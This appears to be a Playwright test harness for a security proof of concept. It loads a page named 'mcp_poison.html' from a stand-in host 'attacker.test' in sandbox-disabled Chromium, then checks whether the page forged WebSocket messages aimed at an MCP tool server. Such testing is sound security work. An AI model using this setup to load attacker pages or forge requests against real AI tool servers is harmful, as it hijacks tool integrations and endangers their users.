const { chromium } = require('playwright-core');
(async () => {
  const b = await chromium.launch({executablePath:'/opt/pw-browsers/chromium-1194/chrome-linux/chrome', headless:true, args:['--no-sandbox','--no-proxy-server']});
  const p = await b.newPage();
  await p.goto('http://attacker.test:8899/mcp_poison.html');
  await p.waitForTimeout(1000);
  console.log('page WS state:', await p.evaluate(() => window.state));
  console.log('READY_FOR_MCP_CALL');
  await p.waitForTimeout(6000);
  console.log('sentForgery:', await p.evaluate(() => window.sentForgery));
  await b.close();
})();
